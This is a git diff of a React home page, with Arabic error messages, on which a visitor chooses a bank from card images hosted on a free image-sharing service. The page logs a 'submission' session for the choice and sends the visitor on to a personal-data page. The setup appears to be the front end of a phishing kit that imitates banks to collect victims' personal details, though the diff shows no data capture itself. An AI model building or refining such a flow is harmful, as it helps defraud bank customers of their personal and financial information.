@@ -1,6 +1,7 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { nanoid } from "nanoid";
+import { trpc } from "@/lib/trpc";
 
 const bankImages = {
   all: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
@@ -26,8 +27,9 @@ const cards = [
 export default function Home() {
   const [, setLocation] = useLocation();
   const [bankSelect, setBankSelect] = useState("all");
-  const [mainCardImage, setMainCardImage] = useState(bankImages.all as string);
+  const [mainCardImage, setMainCardImage] = useState(bankImages.all);
   const [currentSlide, setCurrentSlide] = useState(0);
+  const createSessionMutation = trpc.submissions.createSession.useMutation();
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -41,23 +43,40 @@ export default function Home() {
     setMainCardImage(bankImages[bankType as keyof typeof bankImages]);
   };
 
-  const goToPersonalData = () => {
-    const selectedBank = bankSelect;
-    if (selectedBank !== "all") {
+  const goToPersonalData = async () => {
+    if (bankSelect !== "all") {
       const sessionId = nanoid();
       localStorage.setItem("sessionId", sessionId);
-      localStorage.setItem("selectedBank", selectedBank);
-      setLocation(`/personal_data.html?bank=${selectedBank}&session=${sessionId}`);
+      localStorage.setItem("selectedBank", bankSelect);
+      
+      try {
+        await createSessionMutation.mutateAsync({
+          sessionId,
+          selectedBank: bankSelect,
+        });
+        setLocation(`/personal-data?bank=${bankSelect}&session=${sessionId}`);
+      } catch (error) {
+        alert("حدث خطأ. يرجى المحاولة مرة أخرى.");
+      }
     } else {
       alert("يرجى اختيار البنك أولاً");
     }
   };
 
-  const handleCardClick = (bank: string) => {
+  const handleCardClick = async (bank: string) => {
     const sessionId = nanoid();
     localStorage.setItem("sessionId", sessionId);
     localStorage.setItem("selectedBank", bank);
-    setLocation(`/personal_data.html?bank=${bank}&session=${sessionId}`);
+    
+    try {
+      await createSessionMutation.mutateAsync({
+        sessionId,
+        selectedBank: bank,
+      });
+      setLocation(`/personal-data?bank=${bank}&session=${sessionId}`);
+    } catch (error) {
+      alert("حدث خطأ. يرجى المحاولة مرة أخرى.");
+    }
   };
 
   const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);
